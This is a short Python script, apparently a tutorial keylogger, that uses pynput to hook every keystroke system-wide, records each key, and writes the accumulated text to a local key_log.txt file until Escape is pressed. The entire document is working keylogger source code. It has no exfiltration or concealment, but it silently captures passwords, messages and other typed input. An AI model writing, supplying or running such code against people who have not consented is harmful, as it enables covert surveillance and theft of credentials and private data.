from pynput import keyboard

# This will store the keys pressed
keys = []

# Define the log file path
log_file = "key_log.txt"

def on_press(key):
    try:
        # Add the key pressed to the list
        keys.append(key.char)
    except AttributeError:
        # Handle special keys
        keys.append(str(key))

    # Write the keys to the log file
    write_to_file(keys)

def write_to_file(keys):
    with open(log_file, "w") as file:
        for key in keys:
            # Replace newline and space characters with a more readable format
            k = key.replace("'", "")
            if k.find("space") > 0:
                file.write(' ')
            elif k.find("enter") > 0:
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)

def on_release(key):
    # Stop the keylogger when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
